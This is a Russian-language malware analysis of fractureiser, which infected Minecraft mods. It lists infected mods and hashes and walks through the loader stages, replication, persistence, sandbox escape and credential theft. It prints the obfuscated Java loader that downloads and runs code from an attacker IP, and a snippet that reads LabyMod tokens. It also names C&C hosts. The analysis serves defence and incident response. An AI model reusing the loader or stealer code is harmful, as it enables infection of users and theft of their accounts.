# Техническая информация

## Распространение

Для некоторых модпаков были опубликованы обновления без ведома авторов, которые добавляли вредоносные моды как зависимость. Эти обновления модпаков были заархивированы сразу после загрузки, то есть они *не отображаются в веб-интерфейсе, а только через API.*

У вредоносных модов даты загрузки уходят до нескольких недель в прошлое. Большинство из них были
загружены одноразовыми учетными записями с явно сгенерированными автоматически именами и, скорее всего, были началом
инфекции. Luna Pixel Studios была скомпрометирована из-за того, что разработчик тестировал один из таких модов, потому что новый мод показался ему интересным.

### Известные нам затронутые моды и плагины

Примечание: Этот список **не полный**. Он был составлен в первые дни
расследования, но мы быстро поняли, что масштабы этого были намного больше, чем мы думали,
потому сделав отслеживание отдельных случаев бессмысленным. Он останется здесь на память.

Посмотрите также [список](https://support.curseforge.com/en/support/solutions/articles/9000228509-june-2023-infected-mods-detection-tool/) затронутых проектов на CurseForge.

|мод/плагин|ссылки(-а)|SHA1|"Распространитель"|
|---|---|---|---|
|Skyblock Core|[www.curseforge.com/minecraft/mc-mods/skyblock-core/files/4570565](https://www.curseforge.com/minecraft/mc-mods/skyblock-core/files/4570565) |`33677CA0E4C565B1F34BAA74A79C09A3B690BF41`|Luna Pixel Studios|
|Dungeonz|[legacy.curseforge.com/minecraft/mc-mods/dungeonx/files/4551100 (removed)](https://legacy.curseforge.com/minecraft/mc-mods/dungeonx/files/4551100) |`2DB855A7F40C015F8C9CA7CBAB69E1F1AAFA210B`|fractureiser|
|Haven Elytra|[dev.bukkit.org/projects/havenelytra/files/4551105 (removed)](https://dev.bukkit.org/projects/havenelytra/files/4551105)   [legacy.curseforge.com/minecraft/bukkit-plugins/havenelytra/files/4551105 (removed)](https://legacy.curseforge.com/minecraft/bukkit-plugins/havenelytra/files/4551105) |`284A4449E58868036B2BAFDFB5A210FD0480EF4A`|fractureiser|
|Vault Integrations|[www.curseforge.com/minecraft/mc-mods/vault-integrations-bug-fix/files/4557590 (removed)](https://www.curseforge.com/minecraft/mc-mods/vault-integrations-bug-fix/files/4557590)|`0C6576BDC6D1B92D581C18F3A150905AD97FA080`|simpleharvesting82|
|AutoBroadcast|[www.curseforge.com/minecraft/mc-mods/autobroadcast/files/4567257 (removed)](https://www.curseforge.com/minecraft/mc-mods/autobroadcast/files/4567257)|`C55C3E9D6A4355F36B0710AB189D5131A290DF26`|shyandlostboy81|
|Museum Curator Advanced|[www.curseforge.com/minecraft/mc-mods/museum-curator-advanced/files/4553353 (removed)](https://www.curseforge.com/minecraft/mc-mods/museum-curator-advanced/files/4553353)|`32536577D5BB074ABD493AD98DC12CCC86F30172`|racefd16|
|Vault Integrations Bug fix|[www.curseforge.com/minecraft/mc-mods/vault-integrations-bug-fix/files/4557590 (removed)](https://www.curseforge.com/minecraft/mc-mods/vault-integrations-bug-fix/files/4557590)|`0C6576BDC6D1B92D581C18F3A150905AD97FA080`|simplyharvesting82
|Floating Damage|[dev.bukkit.org/projects/floating-damage (removed)](https://dev.bukkit.org/projects/floating-damage)|`1d1aaccdc13244e980c0c024610ecc77ea2674a33a52129edf1bb4ce3b2cc2fc`|mamavergas3001
|Display Entity Editor|[www.curseforge.com/minecraft/bukkit-plugins/display-entity-editor/files/4570122 (removed)](https://www.curseforge.com/minecraft/bukkit-plugins/display-entity-editor/files/4570122)|`A4B6385D1140C111549D95EAB25CB51922EEFBA2`|santa_faust_2120

Darkhax прислал это: https://gist.github.com/Darkhax/d7f6d1b5bfb51c3c74d3bd1609cab51f

Возможно больше: Sophisticated Core, Dramatic Doors, Moonlight lib, Union lib

## Ступень 0 (Зараженные jar-файлы с модами)

Затронутые моды или плагины содержат новый метод `static void`, вставленный в их основной класс, и вызов этого метода вставлен в статический инициализатор этого класса. Для DungeonZ этот метод называется _d1385bd3c36f464882460aa4f0484c53 и находится в `net.dungeonz.DungeonzMain`. Для Skyblock Core метод называется _f7dba6a3a72049a78a308a774a847180 и вставлен в `com.bmc.coremod.BMCSkyblockCore`. Для HavenElytra код вставлен непосредственно в неиспользуемый статический инициализатор `valorless.havenelytra.HavenElytra`.

Код метода обфусцирован (обезличен и запутан) с помощью `new String(new byte[]{...})` вместо строковых литералов.

Из образца от D3SL «Create Infernal Expansion Plus», версия подражающая «Create Infernal Expansion Compat», со вставленным вредоносным кодом в основной класс мода:
```java
static void _1685f49242dd46ef9c553d8af1a4e0bb() {
  Class.forName(new String(new byte[] {
      // "Utility"
    85, 116, 105, 108, 105, 116, 121
  }), true, (ClassLoader) Class.forName(new String(new byte[] {
      // "java.net.URLClassLoader"
    106, 97, 118, 97, 46, 110, 101, 116, 46, 85, 82, 76, 67, 108, 97, 115, 115, 76, 111, 97, 100, 101, 114
  })).getConstructor(URL[].class).newInstance(new URL[] {
    new URL(new String(new byte[] {
        // "http"
      104, 116, 116, 112
    }), new String(new byte[] {
        // "85.217.144.130"
      56, 53, 46, 50, 49, 55, 46, 49, 52, 52, 46, 49, 51, 48
    }), 8080, new String(new byte[] {
        // "/dl"
        47, 100, 108
        }))
  })).getMethod(new String(new byte[] {
      // "run"
    114, 117, 110
  }), String.class).invoke((Object) null, "-114.-18.38.108.-100");
}
```

Это:
1. Создаёт `URLClassLoader` с URL'ом `http://[85.217.144.130:8080]/dl` ([shodan](https://www.shodan.io/host/85.217.144.130))
2. Загружает класс `Utility` из classloader'а, грузит код из интернета
3. Вызывает метод `run` у `Utility`, передача строкового аргумента, отличающегося для каждого зараженного мода (!). Например:
    * Skyblock Core: "`-74.-10.78.-106.12`"
    * Dungeonz: "`-114.-18.38.108.-100`"
    * HavenElytra: "`-114.-18.38.108.-100`"
    * Vault Integrations: "`-114.-18.38.108.-100`"

Передаваемые числа парсятся как байты 1-ой ступенью и записываются в файл с именем «.ref». Судя по всему, они позволяют автору отслеживать источники заражения.

Создание загрузчика классов жестко привязано к этому URL-адресу и не использует URL-адрес Cloudflare, используемый 1-ой ступенью. Поскольку этот IP-адрес теперь отключен, значит, полезная нагрузка 0-ой ступени, *о которой мы на данный момент знаем*, больше не работает.

## Ступень 1 (`dl.jar`)

SHA-1: `dc43c4685c3f47808ac207d1667cc1eb915b2d82`

[Декомпилированные файлы вредоносного ПО можно найти здесь](../../../decomp).

Что делает `Utility.run` перво-наперво - это проверка, задано ли системное свойство `neko.run`. Если так, то он *немедленно прекращает выполнение*. Если нет, он устанавливает его в пустую строку и продолжает. Похоже, так вредонос пытается избежать многократного запуска, например, если заражены несколько модов. *На это нельзя полагаться как на аварийный выключатель, поскольку первая ступень загружается из интернета и может измениться.*

Он пытается связаться с `85.217.144.130` и доменом на Cloudflare Pages (`https://files-8ie.pages.dev/ip`). Жалобы уже были разосланы. Домен Pages используется для получения IP-адреса C&C-сервера, если первый IP-адрес больше не отвечает, то URL-адрес отвечает двоичным представлением адреса IPv4.

*IP-адрес C&C теперь в nullroute, после жалобы провайдеру сервера. Нам нужно будет следить за страницей Cloudflare, чтобы увидеть, появится ли новый C&C-сервер, я не представляю, чтобы они этого не продумали.* Спасибо, Serverion, за быструю реакцию.

*Домен на Cloudflare Pages был закрыт.* Новый C&C-сервер расположен по адресу `107.189.3.101`.

Затем на первой ступени предпринимается попытка закрепиться, выполнив следующие действия:
1. Загрузка второй ступени (lib.jar для Linux, libWebGL64.jar для Windows) с сервера
2. Автоматический запуск второй ступени при загрузке:
* В Linux он пытается разместить unit-файлы systemd в `/etc/systemd/system` или `~/.config/systemd/user`
    * Unit-файлы, которые он помещает в папку пользователя, никогда не сработают, потому что он пытается использовать `multi-user.target`, которого не существует для пользовательских юнитов
* В Windows пытается изменить реестр
  (`HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`), чтобы запустить себя, или,
  в противном случае, пытается добавить себя в папку `Windows\Start Menu\Programs\Startup`

## Вторая ступень (`lib.jar` или `libWebGL64.jar`)

Известные хэши sha1:
* `52d08736543a240b0cbbbf2da03691ae525bb119`
* `6ec85c8112c25abe4a71998eb32480d266408863` (Предыдущая загрузка D3SL)

Вторая ступень обфусцирована демо-версией обфускатора Allatori, а его основной класс называется `Bootstrap`.
Кроме того, он содержит еще один класс с именем `h`, который похож на простой класс для коммуникации, но в остальном пуст.
Вы можете взглянуть на попытку восстановить исходный код на
https://gist.github.com/SilverAndro/a992f85bec29bb248c354ccf5d2206fe

При запуске делает следующее:
1. Открывает порт `9655` и добавляет перехватичик завершения работы, чтобы закрыть его при завершении jvm.
2. Находит себя на диске и работает рядом с собой
3. Если `.ref` существует, считывает ключ идентификатора из файла.
4. Запускает цикл
    1. Проверяет с помощью `https://[files-8ie.pages.dev]:8083/ip` сервер и пытается подключиться к нему.
    2. Получает флаг, продолжать ли проверку обновлений, если нет, бросает исключение (сообщается серверу через порт `1338`)
    3. Если да, получает хеш и проверяет его на соответствие `client.jar`, если он существует, то отправляет обратно байт - получить обновление или нет
    4. Если да, то получает и перезаписывает/создает `client.jar`, скрывая его с помощью атрибутов файла
    5. Загружает и вызывает статический метод `dev.neko.nekoclient.Client#start(InetAddress, refFileBytes)`
    6. Спит 5 секунд

## Третья ступень (`client.jar`)

sha-1: `c2d0c87a1fe99e3c44a52c48d8bcf65a67b3e9a5`
sha-1: `e299bf5a025f5c3fff45d017c3c2f467fa599915`

`client.jar` — невероятно запутанный и сложный пакет кода, содержащий как Java, так и нативный код.

Он содержит встроенную полезную нагрузку `hook.dll`; декомпилированная: https://gist.githubusercontent.com/NotNite/79ab1e5501e1ef109e8030059356b1b8/raw/c2102bf5ff74275ac44c2200d5121bfff652fd49/hook.dll.c

Есть две встроенные функции для вызова из Java, поскольку они могут вызываться через JNI:
* `__int64 __fastcall Java_dev_neko_nekoclient_api_windows_WindowsHook_retrieveClipboardFiles(__int64 a1);`
* `__int64 __fastcall Java_dev_neko_nekoclient_api_windows_WindowsHook_retrieveMSACredentials(__int64 a1);`

Судя по анализу, они и делают то, что написано на этикетке:
* Чтение содержимого буфера обмена
* Кража учетных данных Microsoft

Также есть свидетельства того, что код пытается сделать следующее:
* Сканирование *всех* jar-файлов в системе, которые выглядят как моды Minecraft (путем обнаружения
  Forge/Fabric/Quilt/Bukkit) или [объявляющих основной
  класс](https://github.com/clrxbl/NekoClient/blob/main/dev/neko/nekoclient/Client.java#L235-L244)
  (большинство нормальных Java-программ) и попытаться внедрить в них нулевую ступень.
* Кража файлов cookie и данных для входа из многих веб-браузеров
* Замена криптовалютных адресов в буфере обмена на другие, которые, предположительно, принадлежат злоумышленнику.
* Кража учетных данных Discord
* Кража учетных данных Microsoft и Minecraft из ряда лаунчеров
* Кража криптокошельков

Jar-файлы эвристически обнаруживаются как моды или плагины Minecraft следующим образом:
* Forge (`dev/neko/e/e/e/A`): Вредонос пытается найти аннотацию `@Mod`, которая требуется у каждого мода.
* Bukkit (`dev/neko/e/e/e/C`): Вредонос проверяет, не расширяет ли (extends) какой-либо класс `JavaPlugin` от Bukkit.
* Fabric/Quilt (`dev/neko/e/e/e/i`): Вредонос проверяет, реализует ли класс `ModInitializer`
* Bungee (`dev/neko/e/e/e/l`): Вредонос проверяет, не расширяет ли (extends) какой-либо класс `Plugin` от Bungee.
* Vanilla (`dev/neko/e/e/e/c`): Вредонос проверяет, не является ли `net.minecraft.client.main.Main` основным клиентским классом

## Третья ступень (`unobf-client.jar`)

Примерно 07.06.2023 в 14:20 по UTC, клиентский jar-файл третьей ступени, по-видимому, был случайно заменён на необфусцированную (не зашифрованную) версию. Архив находится здесь: https://github.com/clrxbl/NekoClient

Это подтверждает предположение о поведении/сведения из раннего анализа обфусцированного образца `client.jar`.

### Репликация

Репликация осуществляется посредством автоматической обработки классов в файлах jar по всей файловой системе локального компьютера. Любой jar-файл, содержащий классы, отвечающие определенным критериям, может быть заражен. Процесс сканирования локальной файловой системы и внедрения вредоносного кода находятся здесь: [`dev/neko/nekoclient/Client.start(InetSocketAddress, byte[])`](https://github.com/clrxbl/NekoClient/ blob/main/dev/neko/nekoclient/Client.java#L273)

Критерии, которые ищутся в процессе, находятся здесь: [`dev/neko/nekoinjector/template/impl`](https://github.com/clrxbl/NekoClient/tree/main/dev/neko/nekoinjector/template/impl)

* `BungeecordPluginTemplate` ищет интерфейс `net/md_5/bungee/api/plugin/Plugin` в классах
* `FabricModTemplate` ищет интерфейс `net/fabricmc/api/ModInitializer` в классах
* `ForgeModTemplate` ищет аннотацию `net/minecraftforge/fml/common/Mod` в классах
* `MinecraftClientTemplate` ищет наличие `net/minecraft/client/main/Main.class` и `net/minecraft/client/gui/GuiMultiplayer.class` в jar-файле.
* `SpigotPluginTemplate` ищет super-тип `org/bukkit/plugin/java/JavaPlugin` в классах
* Если ни один из вышеперечисленных не соответствует классу, [он попытается заразить основной класс jar-файла](https://github.com/clrxbl/NekoClient/blob/main/dev/neko/nekoclient/Client.java#L235-L244) - если есть.

Внедренный вредоносный код представляет собой логику бэкдора, наблюдаемую в нулевой ступени. Внедрение происходит следующим образом: вредоносный код объявляется в классе Loader в статическом методе. Смежный с ним класс Injector отвечает за извлечение кода из Loader и вставку его в новые классы, предназначенные для заражения. Возвращаемое значение `Injector.loadInstallerNode(...)` представляет собой `MethodNode`, описывающий сам процесс заражения. Теперь им просто нужно добавить этот метод в целевой класс. Возвращаясь к [`dev/neko/nekoclient/Client.start(InetSocketAddress, byte[])`](https://github.com/clrxbl/NekoClient/blob/main/dev/neko/nekoclient/Client.java#L272), там для этого вызывается `Entry.inject(MethodNode)`. Чтобы гарантировать вызов вредоносного метода, метод `inject` добавляет логику к статическому инициализатору целевого класса, который вызывает добавленный метод. Поскольку статический инициализатор запускается при первой же загрузке класса, а целевой класс является плагином/модом, предполагается, что этот код всегда будет запускаться пользователями, которые запускают зараженные пакеты модов или серверы. После этого они переупаковывают JAR с новым зараженным целевым классом.

### Трюки против песочницы

Кое-что, что обычно не встречается во вредоносных программах для JVM, представлено здесь — это класс под названием `VMEscape`. Он проверяет, находится ли он внутри [Windows Sandbox](https://learn.microsoft.com/en-us/windows/security/application-security/application-isolation/windows-sandbox/windows-sandbox-overview) через проверку текущего пользователя — `WDAGUtilityAccount`. Если это условие выполнено, делается попытка выхода из песочницы Windows.

Процесс примерно такой:

- Запуск повторяющегося потока для выполнения следующих действий:
  - Создание временного каталога, используя `Files.createTempDirectory(...)`
  - Перебор записей `FileDescriptor` в системном буфере обмена, который зеркалирует буфер обмена хоста.
  - Создрание ярлыка, который выглядит как исходный файл _(с использованием иконок из SHELL32)_, но вместо этого вызывает вредоноса.
  - Запись этого ярлыка в буфер обмена, перезаписывая исходную ссылку на файл.

### Кража данных

**MSA Токены**: Поскольку этот мод нацелен на моды Minecraft, вполне естественно будет попытаться украсть токен MSA, используемый для входа в Minecraft. Некоторые лаунчеры хранят эти данные в локальном файле, из которого эта вредоносная программа попытается их прочитать. Это затрагивает различные лаунчеры, такие как:

* Лаунчер ваниллы/Mojang
* Старый лаунчер ваниллы/Mojang
* PolyMC / Prism
* Technic
* Feather
* LabyMod (< v3.9.59)
* И любой токен MSA, найденный в [Диспетчере учетных данных Windows](https://support.microsoft.com/en-us/windows/accessing-credential-manager-1b5c916a-6a16-889f-8581-fc16e8165ac0)

Логика поиска (см. [`dev/neko/nekoclient/api/stealer/msa/impl/MSAStealer.java`](https://github.com/clrxbl/NekoClient/blob/main/dev/neko/nekoclient/api/stealer/msa/impl/MSAStealer.java)) выглядит одинаково для ряда целей, поскольку хранят они эти данные аналогичным образом. Например, вот код laby-mod:
```java
private static void retrieveRefreshTokensFromLabyMod(List<RefreshToken> refreshTokens) throws IOException {
	String appdata = System.getenv("APPDATA");
	if (Platform.isWindows() || Objects.isNull(appdata)) {
		Path path = appdata == null ? null : Paths.get(appdata, ".minecraft", "LabyMod", "accounts.json");
		if (Files.isReadable(path)) {
			extractRefreshTokensFromLabyModLauncher(refreshTokens, Json.parse(Files.readString(path)).asObject());
		}
	}
}
```
Код для получения токенов из Feather/PolyMC/Prism практически одинаков.

Отличие этого подхода в сравнении с ванильным лаунчером в том, что у этого Json'а есть дополнительный уровень криптографии, защищающий его.

Изменение от этой стратегии для Technic заключается в том, что Technic хранит учетные данные, используя встроенную в Java сериализацию объектов, обертывая тип `com.google.api.client.auth.oauth2.StoredCredential`.

**Discord токены**: Все видели похитителей токенов раньше. Похищает токен и дополнительную информацию, такую ​​как способы оплаты, привязанный номер телефона и т. д. Затрагивает на стандартный клиент, клиенты canary, ptb и lightcord. Соответствующий код: [`dev/neko/nekoclient/api/stealer/discord/DiscordAccount.java`](https://github.com/clrxbl/NekoClient/blob/fd76c5f9d40d1e10de11f00a6b4e0cca3d6221a3/dev/neko/nekoclient/api/stealer/discord/DiscordAccount.java)

**Файлы cookie и сохраненные учетные данные**: Похищает сохраненные файлы cookie и данные для входа, сохраненные в уязвимых браузерах. Соответствующий код: [`dev/neko/nekoclient/api/stealer/browser/impl/BrowserDataStealer.java`](https://github.com/clrxbl/NekoClient/blob/main/dev/neko/nekoclient/api/stealer/browser/impl/BrowserDataStealer.java)

- Mozilla Firefox
  - Waterfox
  - Pale Moon
  - SeaMonkey
- Chrome
  - Edge
  - Brave
  - Vivaldi
  - Yandex
  - Slimjet
  - CentBrowser
  - Comodo
  - Iridium
  - UCBrowser
  - Opera
    - Beta
    - Developer
    - Stable
    - GX
    - Crypto
  - CryptoTab

## Ступень 3b (`dummyloader3.jar`)

Третья ступень была заменена на другой jar-файл через некоторое время после того, как был создан второй C&C-сервер.

Похоже, что это просто программа обновления SkyRage, которая является другой вредоносной программой для minecraft, нацеленной на blackspigot.

### Персистентность
- Windows: Планировщик задач `MicrosoftEdgeUpdateTaskMachineVM`, файл `%AppData%\..\LocalLow\Microsoft\Internet Explorer\DOMStore\microsoft-vm-core`.
- Linux: `/bin/vmd-gnu`, `/etc/systemd/system/vmd-gnu.service`, сервис `vmd-gnu`.

### Подключения
- C&C сервер: `connect.skyrage.de`
- Загружает: `hxxp://t23e7v6uz8idz87ehugwq.skyrage.de/qqqqqqqqq`.

### Действия
- `qqqqqqqqq` jar-файл извлекающий всю возможную информацию (куки браузера, Discord, Minecraft, Epic Games, логин Steam, также что-то с криптокошельками и менеджерами паролей), которую обновленный jar загружает на C&C сервер
- заменяет адреса криптомонет в буфере обмена на адреса, полученные от `95.214.27.172:18734`
- персистентность (см. выше)
- содержит автообновлялку, текущая версия - 932 (`hxxp://t23e7v6uz8idz87ehugwq.skyrage.de/version`)

### Маппинги

Это маппинги для данного образца, которые могут быть применены с Enigma или другим инструментом, поддерживающий маппинги Enigma.
```
CLASS D Chat
CLASS E ChatChain
CLASS E$a ChatChain$ChainLink
CLASS F ClientChat
CLASS G EncryptionRequest
CLASS H EncryptionResponse
CLASS H$a EncryptionResponse$EncryptionData
CLASS J KeepAlive
CLASS L LoginPayloadResponse
CLASS O PluginMessage
CLASS O$1 BungeeCordProtocolVersionMapFunction
CLASS P SetCompression
CLASS R StatusResponse
CLASS T CryptocurrencyClipboardLogger
CLASS T$1 CryptocurrencyClipboardLogger$LowLevelKeyboardHook
CLASS U AutoRunPersistence
CLASS V InputStreamFileWriter
CLASS W OperatingSystem
CLASS X AutoUpdater
CLASS Y StacktraceSerializer
CLASS a MalwareClientConnectionHandler
CLASS b Main
    FIELD a intconst I
    FIELD a string0 Ljava/lang/String;
    FIELD a ipAddress Ljava/net/InetSocketAddress;
CLASS g MinecraftBot
CLASS h MinecraftBot2
CLASS o MinecraftFriendlyByteBuf
CLASS s MinecraftIPAddressResolver
CLASS t MinecraftPacketDecoder
CLASS y MinecraftPacketEncryption
```

### Анти-декомпиляция

Этот пример, по-видимому, эксплуатирует особенности class-файлов, чтобы засбоили инструменты декомпиляции. Такие эксплойты могут быть исправлены с помощью [CAFED00D](https://github.com/Col-E/CAFED00D) - парсера байткода, который отфильтровывает неправильно сформированные атрибуты. После этого единственной оставшейся проблемой является базовая обфускация, применяемая демо-версией Allatori.

# Другие вещи

Больше подробностей можно найти в обновляемом документе по реверсу ступени 3: https://hackmd.io/5gqXVri5S4ewZcGaCbsJdQ

Когда был поднят второй C&C-сервер, деобфусцированная версия третьей ступени случайно раздавалась в течении примерно 40 минут.

Основной сервер полезной нагрузки *был* ~~размещен~~ (теперь отключен) на Serverion, у компании из в Нидерланд.

Новый C&C также был отключен. _2023-06-07 18:51 UTC_

Кроме HTTP-сервера на порту 80/443 и SSH-сервера на порту 22, на `85.217.144.130` и `107.189.3.101` были открыты следующие порты:

* 1337
* 1338 (порт, указанный в файле первой ступени для создания нового соединения с отладчиком)
* 8081 (это WebSocket-сервер - никаких видимых функций сейчас не выполняет, не упоминается в каком-либо вредоносном коде)
* 8082 (от этого никто ничего не получил, не упоминается в каком-либо вредоносном коде)
* 8083 (с ним связывается первая ступень)

Любопытно, что на странице fractureiser на bukkit написано "Last active Sat, Jan, 1 2000 00:00:00" (в последний раз был) https://dev.bukkit.org/members/fractureiser/projects/

## Образцы

Пожалуйста, спрашивайте в IRC-чате о доступе к образцам на чтение или чтение/запись. Исходный код декомпилированного клиента третьей ступени доступен: https://github.com/clrxbl/NekoClient

## Последующие действия
Хотя пока рановато говорить о долгосрочных последующих действиях, весь этот дебош выявил несколько критических проблем в экосистеме модов для Minecraft. Этот раздел - просто мозговой штурм по ним и по тому, как можно что-то улучшить.

#### 1. Недостаточная проверка в репозиториях модов

Что именно делают CurseForge и Modrinth на "ревью" мода? Мы, как сообщество, должны знать об этом, вместо того, чтобы полагаться на security through obscurity (безопасность через неведение).
Надо ли проводить какой-то статический анализ? (у williewillus есть пара идей на этот счет).

#### 2. Отсутствие подписи кода для модов

В отличие от большой части индустрии ПО, моды, выпущенные и загруженные в репозитории, обычно не подписываются ключом подписи, который доказывает, что владелец ключа загрузил мод. Наличие подписи и отдельного механизма распространения/доверия ключей позволило бы обойти проблему взлома аккаунтов CurseForge.

Однако это приводит к более серьезному вопросу о том, как удостовериться в доверии к ключу, поскольку сам факт "такой-то jar имеет такую подпись" должен быть передан от CurseForge/Modrinth по независимому каналу, стандартным способом, чтобы загрузчики или пользователи могли проверить подписи.
Forge пытались внедрить подписи много лет назад, но широкого применения не вышло.

#### 3. Отсутствие воспроизводимых сборок

Тулчейны для Minecraft - один мрак, и сборки обычно не воспроизводятся. Часто бывает так, что скрипты сборки скачивают незакрепленные -SNAPSHOT версии случайных плагинов Gradle и используют их, что приводит к сборкам, которые не воспроизводятся и, следовательно, не поддаются аудиту.

Не исключено, что какой-нибудь плагин Gradle станет вектором атаки в будущем.

#### 4. Отсутствие песочницы в самом Minecraft

Моды для Java Edition всегда обладали всей мощью Java, и это другая сторона медали: вредоносный код способен на многое.
Сам Minecraft не запускается в какой-либо песочнице, и серверы обычно тоже не в песочнице, если только владелец не обладает достаточными знаниями для её настройки.

Хорошую песочницу сложно сделать, особенно в таких системах как Linux, где у SELinux/AppArmor настолько плохой UX, что их никто не применяет.
